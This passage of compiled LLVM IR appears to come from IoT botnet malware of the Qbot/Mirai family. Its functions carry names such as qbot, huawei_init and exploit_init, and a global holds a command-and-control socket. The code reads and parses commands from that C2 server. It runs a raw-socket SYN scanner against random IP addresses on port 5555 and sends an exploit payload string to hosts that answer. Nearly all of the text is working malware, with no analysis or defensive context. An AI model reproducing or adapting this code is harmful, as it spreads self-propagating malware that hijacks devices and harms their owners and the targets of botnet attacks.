  %36 = load i32, i32* @retry, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* @retry, align 4
  br label %5

; <label>:38:                                     ; preds = %15
  tail call void @registerme(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.69, i64 0, i64 0))
  %39 = load i32, i32* @C2, align 4
  %40 = tail call i64 @read(i32 %39, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i64 1024) #8
  %41 = trunc i64 %40 to i32
  store i32 %41, i32* @buffer, align 4
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %38
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %43 = phi i64 [ %60, %.backedge ], [ %40, %.lr.ph.preheader ]
  %sext = shl i64 %43, 32
  %44 = ashr exact i64 %sext, 32
  %45 = getelementptr inbounds [1024 x i8], [1024 x i8]* @buf, i64 0, i64 %44
  store i8 0, i8* %45, align 1
  %46 = tail call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.70, i64 0, i64 0)) #13
  %47 = icmp eq i8* %46, null
  br i1 %47, label %51, label %48

; <label>:48:                                     ; preds = %.lr.ph
  %49 = load i32, i32* @C2, align 4
  %50 = tail call i64 @write(i32 %49, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i64 0, i64 0), i64 6) #8
  br label %51

; <label>:51:                                     ; preds = %.lr.ph, %48
  %52 = tail call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.72, i64 0, i64 0)) #13
  %53 = icmp eq i8* %52, null
  br i1 %53, label %54, label %._crit_edge.loopexit

; <label>:54:                                     ; preds = %51
  %55 = load i8*, i8** @trigger, align 8
  %56 = tail call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i8* %55) #13
  %57 = icmp eq i8* %56, null
  br i1 %57, label %.backedge, label %58

; <label>:58:                                     ; preds = %54
  tail call void @parse_buffer(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0))
  br label %.backedge

.backedge:                                        ; preds = %58, %54
  %59 = load i32, i32* @C2, align 4
  %60 = tail call i64 @read(i32 %59, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i64 1024) #8
  %61 = trunc i64 %60 to i32
  store i32 %61, i32* @buffer, align 4
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %51, %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %38
  %63 = load i32, i32* @C2, align 4
  %64 = tail call i32 @close(i32 %63) #8
  tail call void @exit(i32 0) #14
  unreachable

.loopexit.loopexit:                               ; preds = %30
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %26, %0
  ret void
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #7

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8** nocapture readnone) local_unnamed_addr #1 {
  tail call void @qbot()
  tail call void @table_init()
  tail call void @watchdog_maintain()
  %3 = tail call i32 @rand() #8
  tail call void @huawei_init() #8
  ret i32 0
}

; Function Attrs: noinline nounwind uwtable
define void @exploit_init() local_unnamed_addr #1 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.fd_set, align 8
  %3 = alloca %struct.fd_set, align 8
  %4 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %4 to %struct.timeval*
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca [1514 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %9 = tail call i32 @fork() #8
  store i32 %9, i32* @exploit_scanner_pid, align 4
  %10 = icmp sgt i32 %9, 0
  %11 = icmp eq i32 %9, -1
  %or.cond = or i1 %10, %11
  br i1 %or.cond, label %12, label %._crit_edge.lr.ph

; <label>:12:                                     ; preds = %0
  ret void

._crit_edge.lr.ph:                                ; preds = %0
  %13 = tail call i32 @util_local_addr()
  store i32 %13, i32* @LOCAL_ADDR, align 4
  tail call void @rand_init()
  %14 = tail call i64 @time(i64* null) #8
  %15 = trunc i64 %14 to i32
  store i32 %15, i32* @exploit_fake_time, align 4
  %16 = tail call noalias i8* @calloc(i64 128, i64 5416) #8
  store i8* %16, i8** bitcast (%struct.exploit_scanner_connection** @conn_table to i8**), align 8
  store i32 0, i32* %1, align 4
  %17 = getelementptr inbounds i8, i8* %16, i64 8
  %18 = bitcast i8* %17 to i32*
  store i32 0, i32* %18, align 8
  %19 = bitcast i8* %16 to i32*
  store i32 -1, i32* %19, align 8
  store i32 1, i32* %1, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.lr.ph, %._crit_edge
  %20 = phi i32 [ 1, %._crit_edge.lr.ph ], [ %25, %._crit_edge ]
  %.pre = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %.pre, i64 %21, i32 2
  store i32 0, i32* %22, align 8
  %23 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %.pre, i64 %21, i32 0
  store i32 -1, i32* %23, align 8
  %24 = load i32, i32* %1, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %1, align 4
  %26 = icmp slt i32 %25, 128
  br i1 %26, label %._crit_edge, label %._crit_edge196

._crit_edge196:                                   ; preds = %._crit_edge
  %27 = tail call i32 @socket(i32 2, i32 3, i32 6) #8
  store i32 %27, i32* @exploit_rsck, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %._crit_edge196
  tail call void @exit(i32 0) #14
  unreachable

; <label>:30:                                     ; preds = %._crit_edge196
  %31 = tail call i32 (i32, i32, ...) @fcntl(i32 %27, i32 3, i32 0) #8
  %32 = or i32 %31, 2048
  %33 = tail call i32 (i32, i32, ...) @fcntl(i32 %27, i32 4, i32 %32) #8
  store i32 1, i32* %1, align 4
  %34 = load i32, i32* @exploit_rsck, align 4
  %35 = bitcast i32* %1 to i8*
  %36 = call i32 @setsockopt(i32 %34, i32 0, i32 3, i8* nonnull %35, i32 4) #8
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %.preheader155.preheader, label %38

.preheader155.preheader:                          ; preds = %30
  br label %.preheader155

; <label>:38:                                     ; preds = %30
  %39 = load i32, i32* @exploit_rsck, align 4
  %40 = call i32 @close(i32 %39) #8
  call void @exit(i32 0) #14
  unreachable

.preheader155:                                    ; preds = %.preheader155.preheader, %.preheader155
  %41 = call i32 @rand_next()
  %42 = trunc i32 %41 to i16
  %43 = call zeroext i16 @ntohs(i16 zeroext %42) #12
  %44 = icmp ult i16 %43, 1024
  br i1 %44, label %.preheader155, label %45

; <label>:45:                                     ; preds = %.preheader155
  store i8 69, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 0), align 16
  %46 = call zeroext i16 @htons(i16 zeroext 40) #12
  store i16 %46, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 2) to i16*), align 2
  %47 = call i32 @rand_next()
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 4) to i16*), align 4
  store i8 64, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 8), align 8
  store i8 6, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 9), align 1
  %49 = call zeroext i16 @htons(i16 zeroext 5555) #12
  store i16 %49, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  store i16 %42, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 20) to i16*), align 4
  %50 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %51 = and i16 %50, -241
  %52 = or i16 %51, 80
  store i16 %52, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 34) to i16*), align 2
  %55 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %56 = or i16 %55, 512
  store i16 %56, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %57 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 0
  %58 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 20
  %59 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %2, i64 0, i32 0, i64 0
  %60 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 0
  %61 = bitcast i32* %7 to i8*
  %62 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 16
  %63 = bitcast i8* %62 to i32*
  %64 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 9
  %65 = bitcast i8* %58 to i16*
  %66 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 22
  %67 = bitcast i8* %66 to i16*
  %68 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 32
  %69 = bitcast i8* %68 to i16*
  %70 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 28
  %71 = bitcast i8* %70 to i32*
  %72 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 12
  %73 = bitcast i8* %72 to i32*
  %74 = bitcast %struct.sockaddr_in* %5 to i8*
  %75 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %76 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %78 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  br label %.loopexit150

.loopexit150.loopexit:                            ; preds = %.loopexit
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit, %45
  %.0128 = phi i32 [ undef, %45 ], [ %.1129, %.loopexit150.loopexit ]
  %79 = load i32, i32* @exploit_fake_time, align 4
  %80 = icmp eq i32 %79, %.0128
  br i1 %80, label %.loopexit154, label %.preheader153

.preheader153:                                    ; preds = %.loopexit150
  store i32 0, i32* %1, align 4
  br label %81

; <label>:81:                                     ; preds = %.preheader153, %81
  call void @llvm.memset.p0i8.i64(i8* nonnull %74, i8 0, i64 16, i32 4, i1 false)
  %82 = call i32 @rand_next()
  %83 = trunc i32 %82 to i16
  store i16 %83, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 4) to i16*), align 4
  %84 = load i32, i32* @LOCAL_ADDR, align 4
  store i32 %84, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 12) to i32*), align 4
  %85 = call fastcc i32 @get_random_ip()
  store i32 %85, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 10) to i16*), align 2
  %86 = call zeroext i16 @checksum_generic(i16* bitcast ([40 x i8]* @exploit_scanner_rawpkt to i16*), i32 20) #8
  store i16 %86, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 10) to i16*), align 2
  store i16 %49, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  %87 = load i32, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i32 %87, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 24) to i32*), align 8
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 36) to i16*), align 4
  %88 = call zeroext i16 @htons(i16 zeroext 20) #12
  %89 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* bitcast ([40 x i8]* @exploit_scanner_rawpkt to %struct.iphdr*), i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 20), i16 zeroext %88, i32 20) #8
  store i16 %89, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 36) to i16*), align 4
  store i16 2, i16* %75, align 4
  %90 = load i32, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i32 %90, i32* %76, align 4
  %91 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  store i16 %91, i16* %77, align 2
  %92 = load i32, i32* @exploit_rsck, align 4
  %93 = call i64 @sendto(i32 %92, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 0), i64 40, i32 16384, %struct.sockaddr* nonnull %78, i32 16) #8
  %94 = load i32, i32* %1, align 4
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %1, align 4
  %96 = icmp slt i32 %95, 160
  br i1 %96, label %81, label %.loopexit154.loopexit

.loopexit154.loopexit:                            ; preds = %81
  br label %.loopexit154

.loopexit154:                                     ; preds = %.loopexit154.loopexit, %.loopexit150
  %.1129 = phi i32 [ %.0128, %.loopexit150 ], [ %79, %.loopexit154.loopexit ]
  %97 = tail call i32* @__errno_location() #12
  store i32 0, i32* %97, align 4
  %98 = load i32, i32* @exploit_rsck, align 4
  %99 = call i64 @recvfrom(i32 %98, i8* nonnull %57, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #8
  %100 = trunc i64 %99 to i32
  %101 = icmp slt i32 %100, 1
  br i1 %101, label %.thread, label %.lr.ph167.preheader

.lr.ph167.preheader:                              ; preds = %.loopexit154
  br label %.lr.ph167

.lr.ph167:                                        ; preds = %.lr.ph167.preheader, %.backedge152
  %102 = phi i64 [ %147, %.backedge152 ], [ %99, %.lr.ph167.preheader ]
  %.0127166 = phi i32 [ %.0127.be, %.backedge152 ], [ 0, %.lr.ph167.preheader ]
  %103 = load i32, i32* %97, align 4
  %104 = icmp eq i32 %103, 11
  br i1 %104, label %.thread.loopexit197, label %105

; <label>:105:                                    ; preds = %.lr.ph167
  %sext = shl i64 %102, 32
  %106 = ashr exact i64 %sext, 32
  %107 = icmp ult i64 %106, 40
  br i1 %107, label %.backedge152, label %108

; <label>:108:                                    ; preds = %105
  %109 = load i32, i32* %63, align 16
  %110 = load i32, i32* @LOCAL_ADDR, align 4
  %111 = icmp eq i32 %109, %110
  %112 = load i8, i8* %64, align 1
  %113 = icmp eq i8 %112, 6
  %or.cond181 = and i1 %111, %113
  %114 = load i16, i16* %65, align 4
  %115 = icmp eq i16 %114, %49
  %or.cond183 = and i1 %or.cond181, %115
  %116 = load i16, i16* %67, align 2
  %117 = icmp eq i16 %116, %42
  %or.cond185 = and i1 %or.cond183, %117
  br i1 %or.cond185, label %118, label %.backedge152

; <label>:118:                                    ; preds = %108
  %119 = load i16, i16* %69, align 16
  %120 = and i16 %119, 5888
  %121 = icmp eq i16 %120, 4608
  br i1 %121, label %122, label %.backedge152

; <label>:122:                                    ; preds = %118
  %123 = load i32, i32* %71, align 4
  %124 = call i32 @ntohl(i32 %123) #12
  %125 = add i32 %124, -1
  %126 = call i32 @htonl(i32 %125) #12
  %127 = load i32, i32* %73, align 4
  %128 = icmp eq i32 %126, %127
  br i1 %128, label %.preheader149, label %.backedge152

.preheader149:                                    ; preds = %122
  %129 = icmp slt i32 %.0127166, 128
  br i1 %129, label %.lr.ph, label %.thread.loopexit197

.lr.ph:                                           ; preds = %.preheader149
  %130 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %131 = sext i32 %.0127166 to i64
  br label %132

; <label>:132:                                    ; preds = %.lr.ph, %136
  %indvars.iv = phi i64 [ %131, %.lr.ph ], [ %indvars.iv.next, %136 ]
  %133 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %130, i64 %indvars.iv, i32 2
  %134 = load i32, i32* %133, align 8
  %135 = icmp eq i32 %134, 0
  br i1 %135, label %138, label %136

; <label>:136:                                    ; preds = %132
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %137 = icmp slt i64 %indvars.iv.next, 128
  br i1 %137, label %132, label %.thread.loopexit

; <label>:138:                                    ; preds = %132
  %139 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %130, i64 %indvars.iv
  %140 = icmp eq %struct.exploit_scanner_connection* %139, null
  br i1 %140, label %.thread.loopexit197, label %141

; <label>:141:                                    ; preds = %138
  %142 = trunc i64 %indvars.iv to i32
  %143 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %130, i64 %indvars.iv, i32 3
  store i32 %126, i32* %143, align 4
  %144 = load i16, i16* %65, align 4
  %145 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %130, i64 %indvars.iv, i32 4
  store i16 %144, i16* %145, align 8
  call fastcc void @exploit_setup_connection(%struct.exploit_scanner_connection* nonnull %139)
  br label %.backedge152

.backedge152:                                     ; preds = %141, %105, %108, %122, %118
  %.0127.be = phi i32 [ %.0127166, %105 ], [ %.0127166, %108 ], [ %.0127166, %122 ], [ %142, %141 ], [ %.0127166, %118 ]
  store i32 0, i32* %97, align 4
  %146 = load i32, i32* @exploit_rsck, align 4
  %147 = call i64 @recvfrom(i32 %146, i8* nonnull %57, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #8
  %148 = trunc i64 %147 to i32
  %149 = icmp slt i32 %148, 1
  br i1 %149, label %.thread.loopexit197, label %.lr.ph167

.thread.loopexit:                                 ; preds = %136
  br label %.thread

.thread.loopexit197:                              ; preds = %.preheader149, %.lr.ph167, %.backedge152, %138
  br label %.thread

.thread:                                          ; preds = %.thread.loopexit197, %.thread.loopexit, %.loopexit154
  %150 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %59) #8, !srcloc !7
  %151 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %60) #8, !srcloc !8
  store i32 0, i32* %1, align 4
  br label %152

; <label>:152:                                    ; preds = %.thread, %.thread145
  %.0130175 = phi i32 [ 0, %.thread ], [ %.1131, %.thread145 ]
  %.0132174 = phi i32 [ 0, %.thread ], [ %.1133, %.thread145 ]
  %storemerge136173 = phi i32 [ 0, %.thread ], [ %198, %.thread145 ]
  %153 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %154 = sext i32 %storemerge136173 to i64
  %155 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %153, i64 %154
  %156 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %153, i64 %154, i32 2
  %157 = load i32, i32* %156, align 8
  %158 = icmp eq i32 %157, 0
  br i1 %158, label %.thread145, label %159

; <label>:159:                                    ; preds = %152
  %160 = load i32, i32* @exploit_fake_time, align 4
  %161 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %153, i64 %154, i32 1
  %162 = load i32, i32* %161, align 4
  %163 = sub i32 %160, %162
  %164 = icmp ugt i32 %163, 5
  br i1 %164, label %165, label %170

; <label>:165:                                    ; preds = %159
  %166 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %155, i64 0, i32 0
  %167 = load i32, i32* %166, align 8
  %168 = call i32 @close(i32 %167) #8
  store i32 -1, i32* %166, align 8
  store i32 0, i32* %156, align 8
  %169 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %153, i64 %154, i32 6, i64 0
  call void @util_zero(i8* %169, i32 256)
  %.pre190 = load i32, i32* %1, align 4
  br label %.thread145

; <label>:170:                                    ; preds = %159
  switch i32 %157, label %184 [
    i32 1, label %171
    i32 3, label %171
    i32 4, label %171
  ]

; <label>:171:                                    ; preds = %170, %170, %170
  %172 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %155, i64 0, i32 0
  %173 = load i32, i32* %172, align 8
  %174 = srem i32 %173, 64
  %175 = zext i32 %174 to i64
  %176 = shl i64 1, %175
  %177 = sdiv i32 %173, 64
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 %178
  %180 = load i64, i64* %179, align 8
  %181 = or i64 %176, %180
  store i64 %181, i64* %179, align 8
  %182 = load i32, i32* %172, align 8
  %183 = icmp sgt i32 %182, %.0132174
  %..0132 = select i1 %183, i32 %182, i32 %.0132174
  br label %.thread145

; <label>:184:                                    ; preds = %170
  %185 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %155, i64 0, i32 0
  %186 = load i32, i32* %185, align 8
  %187 = srem i32 %186, 64
  %188 = zext i32 %187 to i64
  %189 = shl i64 1, %188
  %190 = sdiv i32 %186, 64
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %2, i64 0, i32 0, i64 %191
  %193 = load i64, i64* %192, align 8
  %194 = or i64 %189, %193
  store i64 %194, i64* %192, align 8
  %195 = load i32, i32* %185, align 8
  %196 = icmp sgt i32 %195, %.0130175
  %..0130 = select i1 %196, i32 %195, i32 %.0130175
  br label %.thread145

.thread145:                                       ; preds = %152, %184, %171, %165
  %197 = phi i32 [ %.pre190, %165 ], [ %storemerge136173, %171 ], [ %storemerge136173, %184 ], [ %storemerge136173, %152 ]
  %.1133 = phi i32 [ %.0132174, %165 ], [ %..0132, %171 ], [ %.0132174, %184 ], [ %.0132174, %152 ]
  %.1131 = phi i32 [ %.0130175, %165 ], [ %.0130175, %171 ], [ %..0130, %184 ], [ %.0130175, %152 ]
  %198 = add nsw i32 %197, 1
  store i32 %198, i32* %1, align 4
  %199 = icmp slt i32 %198, 128
  br i1 %199, label %152, label %200

; <label>:200:                                    ; preds = %.thread145
  store <2 x i64> <i64 1, i64 0>, <2 x i64>* %4, align 16
  %201 = icmp sgt i32 %.1133, %.1131
  %202 = select i1 %201, i32 %.1133, i32 %.1131
  %203 = add nsw i32 %202, 1
  %204 = call i32 @select(i32 %203, %struct.fd_set* nonnull %2, %struct.fd_set* nonnull %3, %struct.fd_set* null, %struct.timeval* nonnull %tmpcast) #8
  %205 = call i64 @time(i64* null) #8
  %206 = trunc i64 %205 to i32
  store i32 %206, i32* @exploit_fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %207

; <label>:207:                                    ; preds = %200, %.loopexit
  %storemerge137178 = phi i32 [ 0, %200 ], [ %297, %.loopexit ]
  %208 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %209 = sext i32 %storemerge137178 to i64
  %210 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209
  %211 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %210, i64 0, i32 0
  %212 = load i32, i32* %211, align 8
  %213 = icmp eq i32 %212, -1
  br i1 %213, label %.loopexit, label %214

; <label>:214:                                    ; preds = %207
  %215 = sdiv i32 %212, 64
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 %216
  %218 = load i64, i64* %217, align 8
  %219 = srem i32 %212, 64
  %220 = zext i32 %219 to i64
  %221 = shl i64 1, %220
  %222 = and i64 %218, %221
  %223 = icmp eq i64 %222, 0
  br i1 %223, label %249, label %224

; <label>:224:                                    ; preds = %214
  store i32 0, i32* %7, align 4
  store i32 4, i32* %8, align 4
  %225 = load i32, i32* %211, align 8
  %226 = call i32 @getsockopt(i32 %225, i32 1, i32 4, i8* nonnull %61, i32* nonnull %8) #8
  %227 = load i32, i32* %7, align 4
  %228 = or i32 %227, %226
  %229 = icmp eq i32 %228, 0
  br i1 %229, label %230, label %245

; <label>:230:                                    ; preds = %224
  %231 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 2
  %232 = load i32, i32* %231, align 8
  switch i32 %232, label %244 [
    i32 3, label %233
    i32 4, label %241
  ]

; <label>:233:                                    ; preds = %230
  %234 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 8, i64 0
  %235 = call i32 @util_strcpy(i8* %234, i8* getelementptr inbounds ([920 x i8], [920 x i8]* @.str.73, i64 0, i64 0))
  %236 = load i32, i32* %211, align 8
  %237 = call i32 @util_strlen(i8* %234)
  %238 = sext i32 %237 to i64
  %239 = call i64 @send(i32 %236, i8* %234, i64 %238, i32 16384) #8
  call void @util_zero(i8* %234, i32 2560)
  %240 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 6, i64 0
  call void @util_zero(i8* %240, i32 256)
  store i32 4, i32* %231, align 8
  br label %.loopexit

; <label>:241:                                    ; preds = %230
  %242 = load i32, i32* %211, align 8
  %243 = call i32 @close(i32 %242) #8
  store i32 -1, i32* %211, align 8
  store i32 0, i32* %231, align 8
  br label %.loopexit

; <label>:244:                                    ; preds = %230
  store i32 3, i32* %231, align 8
  %.pre191 = load i32, i32* %211, align 8
  br label %249

; <label>:245:                                    ; preds = %224
  %246 = load i32, i32* %211, align 8
  %247 = call i32 @close(i32 %246) #8
  store i32 -1, i32* %211, align 8
  %248 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 2
  store i32 0, i32* %248, align 8
  br label %.loopexit

; <label>:249:                                    ; preds = %214, %244
  %250 = phi i32 [ %212, %214 ], [ %.pre191, %244 ]
  %251 = sdiv i32 %250, 64
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %2, i64 0, i32 0, i64 %252
  %254 = load i64, i64* %253, align 8
  %255 = srem i32 %250, 64
  %256 = zext i32 %255 to i64
  %257 = shl i64 1, %256
  %258 = and i64 %257, %254
  %259 = icmp eq i64 %258, 0
  br i1 %259, label %.loopexit, label %.preheader

.preheader:                                       ; preds = %249
  %260 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 2
  %261 = load i32, i32* %260, align 8
  %262 = icmp eq i32 %261, 0
  br i1 %262, label %.loopexit, label %.lr.ph176

.lr.ph176:                                        ; preds = %.preheader
  %263 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 5
  %264 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 6, i64 0
  %265 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 6, i64 64
  %266 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 1
  br label %267

; <label>:267:                                    ; preds = %.lr.ph176, %.backedge
  %268 = load i32, i32* %263, align 4
  %269 = icmp eq i32 %268, 256
  br i1 %269, label %270, label %271

; <label>:270:                                    ; preds = %267
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %264, i8* nonnull %265, i64 192, i32 1, i1 false)
  store i32 192, i32* %263, align 4
  br label %271

; <label>:271:                                    ; preds = %270, %267
  store i32 0, i32* %97, align 4
  %272 = load i32, i32* %211, align 8
  %273 = load i32, i32* %263, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 6, i64 %274
  %276 = sub nsw i32 256, %273
  %277 = call i32 @exploit_recv_strip_null(i32 %272, i8* %275, i32 %276, i32 16384)
  switch i32 %277, label %289 [
    i32 0, label %.thread148
    i32 -1, label %278
  ]

.thread148:                                       ; preds = %271
  store i32 104, i32* %97, align 4
  br label %280

